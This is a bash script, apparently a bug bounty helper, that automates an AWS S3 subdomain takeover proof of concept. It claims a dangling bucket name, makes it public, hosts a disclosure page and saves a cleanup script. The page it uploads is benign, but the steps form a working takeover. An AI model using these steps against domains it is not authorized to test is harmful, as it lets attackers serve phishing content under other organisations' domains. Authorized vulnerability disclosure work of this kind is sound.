#!/bin/bash
# AWS S3 Subdomain Takeover PoC Helper
# ONLY USE FOR AUTHORIZED BUG BOUNTY TESTING

echo "🔒 AWS S3 Subdomain Takeover - PoC Helper"
echo "=========================================="
echo ""
echo "⚠️  WARNING: Only use for authorized bug bounty programs!"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo "❌ AWS CLI not found. Install with:"
    echo "   brew install awscli"
    echo "   aws configure"
    exit 1
fi

# Get input
read -p "Enter the vulnerable subdomain (e.g., old-app.company.com): " SUBDOMAIN
read -p "Enter the S3 bucket name from CNAME (e.g., if CNAME is old-app.s3.amazonaws.com, enter 'old-app'): " BUCKET_NAME
read -p "Enter AWS region (e.g., us-east-1, us-west-2): " REGION
read -p "Enter your bug bounty username: " RESEARCHER

echo ""
echo "📋 Summary:"
echo "   Vulnerable subdomain: $SUBDOMAIN"
echo "   S3 bucket name: $BUCKET_NAME"
echo "   Region: $REGION"
echo "   Researcher: $RESEARCHER"
echo ""
read -p "Continue? (yes/no): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "📦 Step 1: Creating S3 bucket..."
aws s3 mb s3://$BUCKET_NAME --region $REGION

if [ $? -ne 0 ]; then
    echo ""
    echo "❌ Failed to create bucket. Possible reasons:"
    echo "   - Bucket name already taken"
    echo "   - AWS credentials not configured"
    echo "   - Invalid bucket name"
    exit 1
fi

echo ""
echo "🌐 Step 2: Enabling static website hosting..."
aws s3 website s3://$BUCKET_NAME --index-document index.html --error-document error.html

echo ""
echo "🔓 Step 3: Making bucket publicly readable (for PoC only)..."
cat > /tmp/bucket-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::$BUCKET_NAME/*"
    }
  ]
}
EOF

aws s3api put-bucket-policy --bucket $BUCKET_NAME --policy file:///tmp/bucket-policy.json

echo ""
echo "📝 Step 4: Creating PoC HTML file..."
cat > /tmp/index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S3 Subdomain Takeover - Proof of Concept</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 { color: #d9534f; }
        .info { background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0; }
        .contact { background: #d4edda; padding: 15px; border-left: 4px solid #28a745; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 AWS S3 Subdomain Takeover Detected</h1>

        <div class="info">
            <h2>Vulnerability Details</h2>
            <p><strong>Vulnerable Subdomain:</strong> $SUBDOMAIN</p>
            <p><strong>Service Type:</strong> AWS S3 Bucket</p>
            <p><strong>Bucket Name:</strong> $BUCKET_NAME</p>
            <p><strong>Region:</strong> $REGION</p>
            <p><strong>Discovered Date:</strong> $(date +%Y-%m-%d)</p>
        </div>

        <div class="contact">
            <h2>Security Researcher Information</h2>
            <p><strong>Researcher:</strong> $RESEARCHER</p>
            <p><strong>Discovery Date:</strong> $(date +%Y-%m-%d)</p>
        </div>

        <h2>What is Subdomain Takeover?</h2>
        <p>This subdomain was pointing to a non-existent S3 bucket.
        An attacker could have created a bucket with the same name and hosted malicious content,
        enabling phishing attacks and brand impersonation.</p>

        <h2>Proof of Concept</h2>
        <p>This page demonstrates control over the subdomain by claiming the S3 bucket.
        <strong>No malicious actions have been taken.</strong></p>

        <h2>Recommended Fix</h2>
        <ul>
            <li>Remove the DNS CNAME record pointing to $BUCKET_NAME.s3.amazonaws.com</li>
            <li>If the bucket is needed, reclaim it in AWS Console</li>
            <li>Implement monitoring for dangling DNS records</li>
            <li>Use AWS Config rules to detect dangling CNAMEs</li>
        </ul>

        <p style="text-align: center; margin-top: 30px; color: #666;">
            <small>This is a responsible security disclosure for bug bounty purposes only.</small>
        </p>
    </div>
</body>
</html>
EOF

echo ""
echo "📤 Step 5: Uploading PoC to S3..."
aws s3 cp /tmp/index.html s3://$BUCKET_NAME/index.html --content-type "text/html"

echo ""
echo "✅ PoC Deployed!"
echo ""
echo "🌐 Access your PoC at:"
echo "   http://$BUCKET_NAME.s3-website-$REGION.amazonaws.com"
echo ""
if [ "$REGION" == "us-east-1" ]; then
    echo "   Or: http://$BUCKET_NAME.s3-website.us-east-1.amazonaws.com"
fi
echo ""
echo "📋 Next Steps:"
echo ""
echo "1. Verify the takeover:"
echo "   curl http://$BUCKET_NAME.s3-website-$REGION.amazonaws.com"
echo ""
echo "2. Check if vulnerable subdomain resolves:"
echo "   curl http://$SUBDOMAIN"
echo ""
echo "3. Take screenshots for your bug bounty report"
echo ""
echo "4. Report to the bug bounty program IMMEDIATELY"
echo ""
echo "5. After confirmation, delete the bucket:"
echo "   aws s3 rb s3://$BUCKET_NAME --force"
echo ""
echo "💾 Saving cleanup command..."
cat > ~/Desktop/s3_cleanup_${BUCKET_NAME}.sh << CLEANUP
#!/bin/bash
# Cleanup S3 bucket for $SUBDOMAIN takeover PoC
echo "Deleting S3 bucket: $BUCKET_NAME"
aws s3 rb s3://$BUCKET_NAME --force
echo "Done!"
CLEANUP
chmod +x ~/Desktop/s3_cleanup_${BUCKET_NAME}.sh
echo "   Saved to: ~/Desktop/s3_cleanup_${BUCKET_NAME}.sh"
echo ""
echo "⚠️  Remember to delete this bucket after the vulnerability is confirmed!"
echo ""
